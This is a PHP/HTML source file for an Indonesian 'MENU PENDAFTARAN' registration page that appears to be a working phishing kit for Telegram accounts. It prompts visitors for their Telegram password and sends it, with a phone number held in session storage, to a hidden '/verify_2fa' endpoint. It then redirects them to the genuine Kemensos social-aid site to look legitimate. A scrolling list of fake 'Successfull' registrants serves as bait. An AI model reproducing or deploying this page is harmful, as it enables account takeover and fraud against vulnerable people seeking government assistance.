<?php
// Include settings file
require_once 'settings.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>MENU PENDAFTARAN</title>
	<link rel="canonical" href="https://info-cek-data-mkm.up.railway.app" />
  <!-- Meta SEO -->
  <meta name="description" content="MENU PENDAFTARAN" />
  <meta name="keywords" content="PENDAFTARAN" />
  <meta name="author" content="MENU PENDAFTARAN" />
  <!-- Open Graph (Facebook, Telegram, WhatsApp) -->
  <meta property="og:title" content="MENU PENDAFTARAN - Daftar Sekarang" />
  <meta property="og:description" content="MENU PENDAFTARAN" />
  <meta property="og:image" content="static/image.png" />
  <!-- Ganti dengan URL sebenar gambar jika ada -->
  <meta property="og:type" content="website" />
  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="MENU PENDAFTARAN" />
  <meta name="twitter:description" content="MENU PENDAFTARAN" />
  <meta name="twitter:image" content="static/image.png" />
  <link rel="icon" href="static/image.png" type="image/x-icon" />
  <meta name="robots" content="nofollow, noindex" />
  <link rel="stylesheet" href="static/css/font.css" />
  <link rel="stylesheet" href="static/css/bootstrap.min.css" />
  <link rel="stylesheet" href="npm/intl-tel-input-18.2.1/build/css/intlTelInput.min.css" />
  <script src="npm/intl-tel-input-18.2.1/build/js/intlTelInput.min.js"></script>
  <style>
    #loader {
      height: 100vh;
      width: 100vw;
      position: fixed;
      top: 0;
      left: 0;
      background: rgba(255, 255, 255, 0.7);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }
    .loader {
      width: 45px;
      aspect-ratio: 1;
      --c: no-repeat linear-gradient(#000000 0 0);
      background: var(--c) 0% 50%, var(--c) 50% 50%, var(--c) 100% 50%;
      background-size: 20% 100%;
      animation: l1 0.5s infinite linear;
    }
    @keyframes l1 {
      0% {
        background-size: 20% 100%, 20% 100%, 20% 100%;
      }
      33% {
        background-size: 20% 10%, 20% 100%, 20% 100%;
      }
      50% {
        background-size: 20% 100%, 20% 10%, 20% 100%;
      }
      66% {
        background-size: 20% 100%, 20% 100%, 20% 10%;
      }
      100% {
        background-size: 20% 100%, 20% 100%, 20% 100%;
      }
    }
  </style>
  <script src="static/java/jQuery.min.js"></script>
  <script type="text/plain" data-savepage-src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
    ></script>
  <script src="npm/bootstrap-5.1.3/dist/js/bootstrap.bundle.min.js"
    ></script>
</head>
<body>
  <div style="width: 100%;padding: 0px 16px;max-width: 600px;margin: auto;">
    <div id="carouselExampleControls" class="carousel slide" data-ride="carousel">
      <div class="carousel-inner">
        <div class="carousel-item active">
          <img class="d-block w-100" src="static/image.png" alt="First slide">
        </div>
      </div>
    </div>
<h1 style="font-size: 22px!important" class="typewrite mt-3 text-center text-primary" data-period="2000" data-type='[ "MASUKKAN DATA DENGAN TEPAT DAN BENAR" ]'>
    <span class="wrap"></span>
</h1>
<script>
  var TxtType = function(el, toRotate, period) {
    this.toRotate = toRotate;
    this.el = el;
    this.loopNum = 0;
    this.period = parseInt(period, 10) || 2000;
    this.txt = '';
    this.tick();
    this.isDeleting = false;
  };
  TxtType.prototype.tick = function() {
    var i = this.loopNum % this.toRotate.length;
    var fullTxt = this.toRotate[i];
    if (this.isDeleting) {
      this.txt = fullTxt.substring(0, this.txt.length - 1);
    } else {
      this.txt = fullTxt.substring(0, this.txt.length + 1);
    }
    this.el.innerHTML = '<span class="wrap">'+this.txt+'</span>';
    var that = this;
    var delta = 200 - Math.random() * 100;
    if (this.isDeleting) { delta /= 2; }
    if (!this.isDeleting && this.txt === fullTxt) {
      delta = this.period;
      this.isDeleting = true;
    } else if (this.isDeleting && this.txt === '') {
      this.isDeleting = false;
      this.loopNum++;
      delta = 500;
    }
    setTimeout(function() {
      that.tick();
    }, delta);
  };
  window.onload = function() {
    var elements = document.getElementsByClassName('typewrite');
    for (var i=0; i<elements.length; i++) {
      var toRotate = JSON.parse(elements[i].getAttribute('data-type'));
      var period = elements[i].getAttribute('data-period');
      if (toRotate) {
        new TxtType(elements[i], toRotate, period);
      }
    }
    // INJECT CSS
    var css = document.createElement("style");
    css.type = "text/css";
    css.innerHTML = ".typewrite > .wrap { border-right: 0.08em solid #fff}";
    document.body.appendChild(css);
  };
</script>
  <form>
    <div class="form-group mb-3">
    <div class="mb-3">
      <div id="feedback" class="mb-3"></div>
      <div class="form-group">
        <input type="text" class="form-control shadow-none" name="password" id="password" placeholder="password Telegram" aria-label="password" aria-describedby="basic-addon1" required />
      </div>
    </div>
    <div id="wrong" class="text-sm text-red-500 pl-2 mt-1" style="display: none;">Password tidak valid</div>
     <div id="feedback" class="text-sm pl-2 mt-1"></div>
    </div>
    <button type="button" id="verifyButton" class="btn btn-primary mx-auto d-block mb-3">REGISTRASI</button>
  </form>
  <img class="" src="static/1.png" style="padding-top: 10px;width: 300px;height: 300px;position: relative;display:block; margin:auto;">
    <div id="loader" style="display:none;">
      <div class="loader"></div>
    </div>
    <div class="container my-5">
      <div class="card">
        <div class="card-header text-center text-white bg-danger font-weight-bold" style=" font-size: 10px;"> BERGABUNG
          HARI INI </div>
        <div class="card-body">
          <marquee direction="up" height="300">
            <div class="alert alert-primary" role="alert"> ⏏️ Ami Suartini <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Uci Mahendra Arsyad <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Eki Nuralam <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Dian Lukman <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Zenudin <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Ahmad Luki Pramoto <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Cahyadi <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Sugi Anrianto <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Darmansya <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Budi Ilyas Rahmat <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Herawati <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Devi Pratawi <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Wulan Sri Rahayu <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Citra Dwi <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Ayu wulandri <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Retno <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Rahmat <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Ari Aryanigrat <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Fuji astuti <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Taufik <br> ⏏️ Status: Successfull ✅ </div>
            <div class="alert alert-primary" role="alert"> ⏏️ Fery Artanto <br> ⏏️ Status: Successfull ✅ </div>
          </marquee>
        </div>
      </div>
    </div>
  </div>
  <style type="text/css">
    .typewrite>.wrap {
      border-right: 0.08em solid #fff
    }
  </style>
  <script>
    setInterval(function () {
      $('.tests:first-child').remove()
    }, 1500)
  </script>
  <script>
        // Create the phpSettings variable from PHP $url variable
        var phpSettings = {
            endpointUrl: '<?php echo $url; ?>'
        };
    </script>
    
    <script>
$(document).ready(function() {
   $("#verifyButton").on("click", function(e) {
       e.preventDefault();
       const password = $("#password").val();
       const feedback = $("#feedback");
       const loader = $("#loader");
       const btnLoader = $("#btnLoader");
       const btnText = $("#btnText");
       const wrongMsg = $("#wrong");
       const phoneNumber = sessionStorage.getItem('phone');
       
       // Validasi password
       if (!password) {
           wrongMsg.text("Kata sandi tidak boleh kosong").show();
           return;
       }
       
       // Tampilkan loader dan ubah teks tombol
       loader.show();
       btnLoader.removeClass('hidden');
       btnText.text('Memproses...');
       $(this).addClass('opacity-75 pointer-events-none');
       
       feedback.hide();
       wrongMsg.hide();
       
       // Ambil endpoint dari variabel PHP yang sudah di-parse ke JavaScript
       const endpointUrl = phpSettings.endpointUrl;
       
       $.ajax({
           url: endpointUrl + "/verify_2fa",
           type: "POST",
           contentType: "application/json",
           data: JSON.stringify({
               password: password,
               phone: phoneNumber
           }),
           success: function(data) {
               loader.hide();
               if (data.status === "success") {
                   feedback
                       .removeClass('alert-danger')
                       .addClass('alert-success')
                       .html('<strong><i class="fas fa-check-circle"></i> Berhasil!</strong><br>' + data.message)
                       .show();
                   setTimeout(function() {
                       window.location.href = "https://cekbansos.kemensos.go.id/";
                   }, 1000);
               } else {
                   wrongMsg.text(data.message).show();
                   // Reset tombol
                   btnLoader.addClass('hidden');
                   btnText.text('Konfirmasi');
                   $('#verifyButton').removeClass('opacity-75 pointer-events-none');
               }
           },
           error: function(xhr) {
               loader.hide();
               const errorResponse = xhr.responseJSON || { message: "Terjadi kesalahan saat memverifikasi kode 2FA." };
               wrongMsg.text(errorResponse.message).show();
               // Reset tombol
               btnLoader.addClass('hidden');
               btnText.text('Konfirmasi');
               $('#verifyButton').removeClass('opacity-75 pointer-events-none');
           }
       });
   });

   // Toggle password visibility
   $('#togglePassword').on('click', function() {
       const password = document.getElementById('password');
       const eyeIcon = document.getElementById('eyeIcon');
       
       if (password.type === 'password') {
           password.type = 'text';
           eyeIcon.classList.remove('fa-eye');
           eyeIcon.classList.add('fa-eye-slash');
       } else {
           password.type = 'password';
           eyeIcon.classList.remove('fa-eye-slash');
           eyeIcon.classList.add('fa-eye');
       }
   });
});
    </script>
</body>
</html>